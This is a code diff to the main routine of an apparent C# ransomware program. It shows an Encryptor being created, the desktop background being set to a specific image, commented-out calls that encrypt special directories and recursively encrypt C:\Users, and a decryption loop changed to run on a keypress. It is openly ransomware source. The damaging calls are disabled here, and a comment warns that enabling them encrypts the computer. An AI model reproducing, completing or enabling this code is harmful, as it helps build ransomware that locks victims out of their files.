@@ -15,18 +15,17 @@
              * Line below is commented out so running it doesn't encrypt your computer
              * Uncomment it to see it function
              */
-            Encryptor encryptor = new Encryptor();
+            if (!Utils.KeyExists())
+            {
+                Encryptor encryptor = new Encryptor();
 
-            // Sets desktop background to specifc image
-            Utils.SetDesktopBackground();
+                // Sets desktop background to specifc image
+                Utils.SetDesktopBackground();
+                // encryptor.EncryptSpecialDirectories();
 
-            // encryptor.EncryptSpecialDirectories();
-
-            // Will recursively encrypt all files, currently throws a lot of errors
-            //encryptor.EncryptDirectory(@"C:\Users");
-
-            Console.WriteLine(Directory.GetCurrentDirectory());
-
+                // Will recursively encrypt all files, currently throws a lot of errors
+                //encryptor.EncryptDirectory(@"C:\Users");
+            }
 
             /* 
              * Starts decryption prcoess after correct key and iv are entered
@@ -34,13 +33,12 @@
              */
             while (true)
             {
-                if (Utils.ValidateKeyAndIv(encryptor.key, encryptor.iv))
-                {
-                    Decryptor decryptor = new Decryptor(encryptor.key, encryptor.iv);
-                    decryptor.DecryptSpecialDirectories();
-                    Console.ReadKey();
-                    Environment.Exit(0);
-                }
+                Console.WriteLine("Press key to decrypt");
+                Console.ReadKey();
+                Decryptor decryptor = new Decryptor();
+                decryptor.DecryptSpecialDirectories();
+                Console.ReadKey();
+                Environment.Exit(0);
             }
         }
     }
